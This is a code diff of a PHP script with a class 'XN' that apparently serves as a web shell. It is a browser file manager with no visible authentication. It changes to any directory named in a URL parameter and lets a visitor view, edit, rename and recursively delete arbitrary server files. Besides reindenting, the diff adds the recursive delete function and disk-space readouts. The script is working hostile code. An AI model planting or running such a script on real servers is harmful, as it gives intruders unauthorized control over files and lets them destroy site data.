@@ -29,9 +29,9 @@ class XN {
         } return self::$array;
     }
     public static function save($filename, $data) {
-    	self::$handle = fopen($filename, "w");
-    	fwrite(self::$handle, $data);
-    	fclose(self::$handle);
+        self::$handle = fopen($filename, "w");
+        fwrite(self::$handle, $data);
+        fclose(self::$handle);
     }
     public static function size($filename) {
         if (is_file($filename)) {
@@ -48,89 +48,110 @@ class XN {
         }
     }
     public static function wr($filename, $perms) {
-    	if (is_writable($filename)) {
-    		print "<font color='green'>{$perms}</font>";
-    	} else {
+        if (is_writable($filename)) {
+            print "<font color='green'>{$perms}</font>";
+        } else {
             print "<font color='red'>{$perms}</font>";
         }
     }
     public static function perms($filename) {
-    	$perms = @fileperms($filename);
-    	switch ($perms & 0xF000) {
-    		case 0xC000:
-        		$info = 's';
-        		break;
-    		case 0xA000:
-        		$info = 'l';
-        		break;
-    		case 0x8000:
-        		$info = 'r';
-        		break;
-    		case 0x6000:
-        		$info = 'b';
-        		break;
-    		case 0x4000:
-        		$info = 'd';
-        		break;
-    		case 0x2000:
-        		$info = 'c';
-        		break;
-    		case 0x1000:
-        		$info = 'p';
-        		break;
-    		default:
-        		$info = 'u';
+        $perms = @fileperms($filename);
+        switch ($perms & 0xF000) {
+            case 0xC000:
+                $info = 's';
+                break;
+            case 0xA000:
+                $info = 'l';
+                break;
+            case 0x8000:
+                $info = 'r';
+                break;
+            case 0x6000:
+                $info = 'b';
+                break;
+            case 0x4000:
+                $info = 'd';
+                break;
+            case 0x2000:
+                $info = 'c';
+                break;
+            case 0x1000:
+                $info = 'p';
+                break;
+            default:
+                $info = 'u';
         }
-
-		$info .= (($perms & 0x0100) ? 'r' : '-');
-		$info .= (($perms & 0x0080) ? 'w' : '-');
-		$info .= (($perms & 0x0040) ?
-            		(($perms & 0x0800) ? 's' : 'x' ) :
-            		(($perms & 0x0800) ? 'S' : '-'));
-
-		$info .= (($perms & 0x0020) ? 'r' : '-');
-		$info .= (($perms & 0x0010) ? 'w' : '-');
-		$info .= (($perms & 0x0008) ?
-            		(($perms & 0x0400) ? 's' : 'x' ) :
-            		(($perms & 0x0400) ? 'S' : '-'));
-
-		$info .= (($perms & 0x0004) ? 'r' : '-');
-		$info .= (($perms & 0x0002) ? 'w' : '-');
-		$info .= (($perms & 0x0001) ?
-            		(($perms & 0x0200) ? 't' : 'x' ) :
-            		(($perms & 0x0200) ? 'T' : '-'));
-		return $info;
-	}
-	public static function OS() {
+        $info .= (($perms & 0x0100) ? 'r' : '-');
+        $info .= (($perms & 0x0080) ? 'w' : '-');
+        $info .= (($perms & 0x0040) ?
+                    (($perms & 0x0800) ? 's' : 'x' ) :
+                    (($perms & 0x0800) ? 'S' : '-'));
+        $info .= (($perms & 0x0020) ? 'r' : '-');
+        $info .= (($perms & 0x0010) ? 'w' : '-');
+        $info .= (($perms & 0x0008) ?
+                    (($perms & 0x0400) ? 's' : 'x' ) :
+                    (($perms & 0x0400) ? 'S' : '-'));
+        $info .= (($perms & 0x0004) ? 'r' : '-');
+        $info .= (($perms & 0x0002) ? 'w' : '-');
+        $info .= (($perms & 0x0001) ?
+                    (($perms & 0x0200) ? 't' : 'x' ) :
+                    (($perms & 0x0200) ? 'T' : '-'));
+        return $info;
+    }
+    public static function OS() {
         return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
     }
     public static function getext($filename) {
-    	return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
     }
     public static function SLES() {
-    	if (self::OS() == 'Windows') {
-    		return str_replace('\\', '/', DIRECTORY_SEPARATOR);
-    	} elseif (self::OS() == 'Linux') {
-    		return DIRECTORY_SEPARATOR;
-    	}
+        if (self::OS() == 'Windows') {
+            return str_replace('\\', '/', DIRECTORY_SEPARATOR);
+        } elseif (self::OS() == 'Linux') {
+            return DIRECTORY_SEPARATOR;
+        }
     }
     public static function sortname($filename, $type) {
-    	switch ($type) {
-    		case "1":
-    			if (strlen($filename) > 50) {
-    				$result = substr($filename, 0, 50)."...";
-    			} else {
-    				$result = $filename;
-    			}
-    			break;
-    	} return $result;
+        switch ($type) {
+            case "1":
+                if (strlen($filename) > 50) {
+                    $result = substr($filename, 0, 50)."...";
+                } else {
+                    $result = $filename;
+                }
+                break;
+        } return $result;
+    }
+    public static function delete($filename) {
+        if (@is_dir($filename)) {
+            $scandir = @scandir($filename);
+            foreach ($scandir as $object) {
+                if ($object != '.' && $object != '..') {
+                    if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
+                        self::delete($filename.DIRECTORY_SEPARATOR.$object);
+                    } else {
+                        @unlink($filename.DIRECTORY_SEPARATOR.$object);
+                    }
+                }
+            } if (@rmdir($filename)) {
+                return true;
+            } else {
+                return false;
+            }
+        } else {
+            if (@unlink($filename)) {
+                return true;
+            } else {
+                return false;
+            }
+        }
     }
     public static function editname($filename, $angka) {
-    	if (strlen($filename) > $angka) {
-    		$result = substr($filename, 0, $angka)."...";
-    	} else {
-    		$result = $filename;
-    	} return $result;
+        if (strlen($filename) > $angka) {
+            $result = substr($filename, 0, $angka)."...";
+        } else {
+            $result = $filename;
+        } return $result;
     }
     public static function owner($filename) {
         if (function_exists("posix_getpwuid")) {
@@ -150,13 +171,29 @@ class XN {
         return date('d M Y - H:i A', filemtime($filename));
     }
     public static function renames($filename, $newname) {
-    	return rename($filename, $newname);
+        return rename($filename, $newname);
     }
     public static function cd($directory) {
         return @chdir($directory);
     }
     public static function countDir($filename) {
         return @count(scandir($filename)) -2;
+    }
+    public static function formatSize( $bytes ){
+        $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
+        for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
+            return( round( $bytes, 2 )." ".$types[$i] );
+    }
+    public static function hdd($type = null) {
+        switch ($type) {
+            case 'free':
+                return self::formatSize(disk_free_space(getcwd()));
+                break;
+            case 'total':
+                return self::formatSize(disk_total_space(getcwd()));
+                break;
+        }
+        
     }
     public static function countAllFiles($directory) {
         self::$array = array();
@@ -175,24 +212,25 @@ class XN {
     }
 }
 if (isset($_GET['x'])) {
-	XN::cd($_GET['x']);
+    XN::cd($_GET['x']);
 }
 function alert($icon, $title, $text) {
-	?>
-	<script type="text/javascript">
-		Swal.fire({
-			icon: '<?= $icon ?>',
-  			title: '<?= $title ?>',
-  			text: '<?= $text ?>'
-		})
-	</script>
-	<?php
+    ?>
+    <script type="text/javascript">
+        Swal.fire({
+            icon: '<?= $icon ?>',
+            title: '<?= $title ?>',
+            text: '<?= $text ?>'
+        })
+    </script>
+    <?php
 }
 ?>
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
 <style type="text/css">
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
     body {
+        color: #292929;
         overflow: hidden;
         margin: 0;
         margin-top: 10px;
@@ -201,13 +239,13 @@ function alert($icon, $title, $text) {
         font-family: 'Open Sans', sans-serif;
     }
     .count {
-    	box-shadow: 0px 0px 0px 2px #e0e0e0;
-    	padding:10px;
-    	padding-left:20px;
+        box-shadow: 0px 0px 0px 2px #e0e0e0;
+        padding:10px;
+        padding-left:20px;
     }
     .storage {
-    	box-shadow: 0px 2px 2px 0px #e0e0e0;
-    	padding:25px;
+        box-shadow: 0px 2px 2px 0px #e0e0e0;
+        padding:25px;
         padding-top:10px;
         padding-bottom:10px;
     }
@@ -215,14 +253,15 @@ function alert($icon, $title, $text) {
         font-size: 23px;
     }
     .storage span:nth-child(4) {
-    	font-size: 10px;
+        font-size: 10px;
     }
     .storage span:nth-child(3) {
         float: right;
         font-size: 10px;
     }
     .back {
-    	padding:20px;
+        font-weight: bold;
+        padding:20px;
         font-size: 20px;
         padding-bottom: 10px;
     }
@@ -256,43 +295,43 @@ function alert($icon, $title, $text) {
         width:50%;
     }
     .table {
-    	padding:20px;
+        padding:20px;
         overflow: auto;
         height:390px;
 
     }
     .edit {
-    	padding-left: 25px;
-    	padding-right: 25px;
+        padding-left: 25px;
+        padding-right: 25px;
     }
     .edit table td {
-    	padding-top:10px;
-    	padding-bottom: 10px;
+        padding-top:10px;
+        padding-bottom: 10px;
     }
     .edit button {
-    	border-radius: 5px;
-    	font-size: 15px;
-    	background: #413bff;
-    	border: 1px solid #413bff;
-    	color: #fff;
-    	padding: 5px;
-    	padding-left:10px;
-    	padding-right: 10px;
+        border-radius: 5px;
+        font-size: 15px;
+        background: #413bff;
+        border: 1px solid #413bff;
+        color: #fff;
+        padding: 5px;
+        padding-left:10px;
+        padding-right: 10px;
     }
     .edit input[type=submit] {
-    	width: 100%;
-    	border-radius: 5px;
-    	font-size: 18px;
-    	background: #413bff;
-    	border: 1px solid #413bff;
-    	color: #fff;
-    	padding: 5px;
+        width: 100%;
+        border-radius: 5px;
+        font-size: 18px;
+        background: #413bff;
+        border: 1px solid #413bff;
+        color: #fff;
+        padding: 5px;
     }
     textarea {
-    	width: 100%;
-    	height:270px;
-    	border-radius: 10px;
-    	border: 1px solid #ebebeb;
+        width: 100%;
+        height:270px;
+        border-radius: 10px;
+        border: 1px solid #ebebeb;
         background: #ebebeb;
         outline: none;
         padding:20px;
@@ -327,7 +366,7 @@ function alert($icon, $title, $text) {
         margin-right: 10px;
     }
     .block .name {
-    	display: inline-block;
+        display: inline-block;
     }
     .block .date {
         margin-top: 4px;
@@ -336,27 +375,28 @@ function alert($icon, $title, $text) {
     }
     .block .date .dir-size,
     .block .date .file-size {
-    	min-width:90px;
-    	display: inline-block;
+        min-width:90px;
+        display: inline-block;
     }
     .block .date .dir-perms,
     .block .date .file-perms {
-    	min-width:100px;
-    	display: inline-block;
+        min-width:100px;
+        display: inline-block;
     }
     .block .date .dir-time,
     .block .date .file-time {
-    	min-width:150px;
-    	display: inline-block;
+        min-width:150px;
+        display: inline-block;
     }
     .block .date .dir-owner,
     .block .date .file-owner {
-    	min-width:100px;
-    	display: inline-block;
+        min-width:100px;
+        display: inline-block;
     }
     .block a {
         border-radius:5px;
         display: block;
+        color: #292929;
         padding-top: 8px;
         padding-bottom: 13px;
         padding-left:5px;
@@ -366,7 +406,7 @@ function alert($icon, $title, $text) {
         text-decoration: none;
     }
     a {
-    	color: #000;
+        color: #000;
         text-decoration: none;
     }
     nav {
@@ -394,8 +434,8 @@ function alert($icon, $title, $text) {
         list-style-type: none;
     }
     ul.dropdown li button {
-    	text-align: left;
-    	outline: none;
+        text-align: left;
+        outline: none;
         color: #000;
         width: 100%;
         font-size:18px;
@@ -406,7 +446,7 @@ function alert($icon, $title, $text) {
         display: block;
     }
     ul.dropdown li button:hover {
-    	cursor: pointer;
+        cursor: pointer;
         text-decoration: none;
         background: #efefef;
     }
@@ -441,87 +481,94 @@ function alert($icon, $title, $text) {
 </script>
 <center>
 <div class="files">
-	<?php
+    <?php
     switch (@$_POST['action']) {
-    	case 'edit':
-    	if (isset($_POST['save'])) {
-    		if (XN::save($_POST['file'], $_POST['data'])) {
-    			alert("error", "Permission Danied", "");
-    		} else {
-    			alert("success", "Success", "");
-    		}
-    	}
-    		?>
-    		<div class="back">
-    			<a href="?x=<?= getcwd() ?>">
-    				<i class="fa fa-arrow-left" aria-hidden="true"></i>
-        		</a>
-        		<span>
-            		EDIT
-        		</span>
-        		<button>
-            		<i class="fa fa-ellipsis-h" aria-hidden="true"></i>
-        		</button>
-    		</div>
-    		<div class="edit">
-    			<table>
-    				<tr>
-    					<td>
-    						Filename
-    					</td>
-    					<td>:</td>
-    					<td>
-    						<?= XN::wr(basename($_POST['file']), 
-    							XN::editname(basename($_POST['file']), 55)) ?>
-    					</td>
-    				</tr>
-    				<tr>
-    					<td>
-    						Size
-    					</td>
-    					<td>:</td>
-    					<td>
-    						<?= XN::size($_POST['file']) ?>
-    					</td>
-    				</tr>
-    				<tr>
-    					<td>
-    						Last Modif
-    					</td>
-    					<td>:</td>
-    					<td>
-    						<?= XN::ftime($_POST['file']) ?>
-    					</td>
-    				</tr>
-    				<tr>
-    					<form method="post">
-    						<td colspan="3">
-    							<button disabled>Edit</button>
-    							<button>Delete</button>
-    							<button>Rename</button>
-    							<button>Backup</button>
-    						</td>
-    					</form>
-    				</tr>
-    				<form method="post">
-    					<tr>
-    						<td colspan="3">
-    							<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
-    						</td>
-    					</tr>
-    					<tr>
-    						<td colspan="3">
-    							<input type="submit" name="save" value="SAVE">
-    							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-    							<input type="hidden" name="action" value="edit">
-    						</td>
-    					</tr>
-    				</form>
-    			</table>
-    		</div>
-    		<?php
-    		exit;
-    		break;
+        case 'delete':
+            if (XN::delete($_POST['file'])) {
+                alert("success", "Success", "".basename($_POST['file'])." Deleted");
+            } else {
+                alert("error", "Permission Danied", "");
+            }
+            break;
+        case 'edit':
+        if (isset($_POST['save'])) {
+            if (XN::save($_POST['file'], $_POST['data'])) {
+                alert("error", "Permission Danied", "");
+            } else {
+                alert("success", "Success", "");
+            }
+        }
+            ?>
+            <div class="back">
+                <a href="?x=<?= getcwd() ?>">
+                    <i class="fa fa-arrow-left" aria-hidden="true"></i>
+                </a>
+                <span>
+                    EDIT
+                </span>
+                <button>
+                    <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
+                </button>
+            </div>
+            <div class="edit">
+                <table>
+                    <tr>
+                        <td>
+                            Filename
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <?= XN::wr(basename($_POST['file']), 
+                                XN::editname(basename($_POST['file']), 55)) ?>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            Size
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <?= XN::size($_POST['file']) ?>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            Last Modif
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <?= XN::ftime($_POST['file']) ?>
+                        </td>
+                    </tr>
+                    <tr>
+                        <form method="post">
+                            <td colspan="3">
+                                <button disabled>Edit</button>
+                                <button>Delete</button>
+                                <button>Rename</button>
+                                <button>Backup</button>
+                            </td>
+                        </form>
+                    </tr>
+                    <form method="post">
+                        <tr>
+                            <td colspan="3">
+                                <textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="3">
+                                <input type="submit" name="save" value="SAVE">
+                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+                                <input type="hidden" name="action" value="edit">
+                            </td>
+                        </tr>
+                    </form>
+                </table>
+            </div>
+            <?php
+            exit;
+            break;
     }
     ?>
     <div class="back">
@@ -539,8 +586,8 @@ function alert($icon, $title, $text) {
         <span class="title">
             STORAGE
         </span>
-        <br><span>Total : 500 GB</span>
-        <span>Free : 100 GB</span>
+        <br><span>Total : <?= XN::hdd('total') ?></span>
+        <span>Free : <?= XN::hdd('free') ?></span>
     </div>
     <div class="table">
     <table>
@@ -557,17 +604,17 @@ function alert($icon, $title, $text) {
                                 <?= $dir['names'] ?>
                                 <div class="date">
                                     <div class="dir-size">
-                                    	<?= $dir['size'] ?>
+                                        <?= $dir['size'] ?>
                                     </div>
                                     <div class="dir-perms">
-                                    	<?= XN::wr($dir['name'], 
-                                    	XN::perms($dir['name'])) ?>
+                                        <?= XN::wr($dir['name'], 
+                                        XN::perms($dir['name'])) ?>
                                     </div>
                                     <div class="dir-time">
-                                    	<?= $dir['ftime'] ?>
+                                        <?= $dir['ftime'] ?>
                                     </div>
                                     <div class="dir-owner">
-                                    	<?= $dir['owner'] ?>
+                                        <?= $dir['owner'] ?>
                                     </div>
                                 </div>
                             </div>
@@ -577,20 +624,22 @@ function alert($icon, $title, $text) {
                 <td>
                     <nav>
                         <a class="dropdown-toggle" title="Menu">
-                            <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
+                            <span style="color: #787878;">
+                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
+                            </span>
                         </a>
                         <ul class="dropdown">
-                        	<form method="post" action="?x=<?= getcwd() ?>">
-                            	<li>
-                            		<button name="action" value="delete">Delete</button>
-                            	</li>
-                            	<li>
-                            		<button name="action" value="rename">Rename</button>
-                            	</li>
-                            	<li>
-                            		<button name="action" value="backup">Backup</button>
-                            	</li>
-                            	<input type="hidden" name="file" value="<?= $file['name'] ?>">
+                            <form method="post" action="?x=<?= getcwd() ?>">
+                                <li>
+                                    <button name="action" value="delete">Delete</button>
+                                </li>
+                                <li>
+                                    <button name="action" value="rename">Rename</button>
+                                </li>
+                                <li>
+                                    <button name="action" value="backup">Backup</button>
+                                </li>
+                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </ul>
                     </nav>
@@ -609,17 +658,17 @@ function alert($icon, $title, $text) {
                                 <?= XN::sortname($file['names'], '1') ?>
                                 <div class="date">
                                     <div class="file-size">
-                                    	<?= $file['size'] ?>
+                                        <?= $file['size'] ?>
                                     </div>
                                     <div class="file-perms">
-                                    	<?= XN::wr($file['name'], 
-                                    	XN::perms($file['name'])) ?>
+                                        <?= XN::wr($file['name'], 
+                                        XN::perms($file['name'])) ?>
                                     </div>
                                     <div class="file-time">
-                                    	<?= $file['ftime'] ?>
+                                        <?= $file['ftime'] ?>
                                     </div>
                                     <div class="file-owner">
-                                    	<?= $file['owner'] ?>
+                                        <?= $file['owner'] ?>
                                     </div>
                                 </div>
                             </div>
@@ -629,49 +678,51 @@ function alert($icon, $title, $text) {
                 <td>
                     <nav>
                         <a class="dropdown-toggle" title="Menu">
-                            <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
+                            <span style="color: #787878;">
+                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
+                            </span>
                         </a>
                         <ul class="dropdown">
-                        	<form method="post" action="?x=<?= getcwd() ?>">
-                        		<?php
-                        		switch (XN::getext($file['name'])) {
-                        			case 'jpg':
-                        			case 'png':
-                        			case 'gif':
-                        			case 'jpeg':
-                        			case 'ico':
-                        				?>
-                        				<li>
-                            				<button name="action" value="delete">Delete</button>
-                            			</li>
-                            			<li>
-                            				<button name="action" value="rename">Rename</button>
-                            			</li>
-                            			<li>
-                            				<button name="action" value="backup">Backup</button>
-                            			</li>
-                        				<?php
-                        				break;
-                        			
-                        			default:
-                        				?>
-                        				<li>
-                        					<button name="action" value="edit">Edit</button>
-                        				</li>
-                            			<li>
-                            				<button name="action" value="delete">Delete</button>
-                            			</li>
-                            			<li>
-                            				<button name="action" value="rename">Rename</button>
-                            			</li>
-                            			<li>
-                            				<button name="action" value="backup">Backup</button>
-                            			</li>
-                        				<?php
-                        				break;
-                        		}
-                        		?>
-                            	<input type="hidden" name="file" value="<?= $file['name'] ?>">
+                            <form method="post" action="?x=<?= getcwd() ?>">
+                                <?php
+                                switch (XN::getext($file['name'])) {
+                                    case 'jpg':
+                                    case 'png':
+                                    case 'gif':
+                                    case 'jpeg':
+                                    case 'ico':
+                                        ?>
+                                        <li>
+                                            <button name="action" value="delete">Delete</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="rename">Rename</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="backup">Backup</button>
+                                        </li>
+                                        <?php
+                                        break;
+                                    
+                                    default:
+                                        ?>
+                                        <li>
+                                            <button name="action" value="edit">Edit</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="delete">Delete</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="rename">Rename</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="backup">Backup</button>
+                                        </li>
+                                        <?php
+                                        break;
+                                }
+                                ?>
+                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </ul>
                     </nav>
@@ -682,7 +733,7 @@ function alert($icon, $title, $text) {
     </table>
     </div>
     <div class="count">
-    	Total Files : <?= XN::countAllFiles(getcwd()) ?>
+        Total Files : <?= XN::countAllFiles(getcwd()) ?>
     </div>
 </div>
 </center>
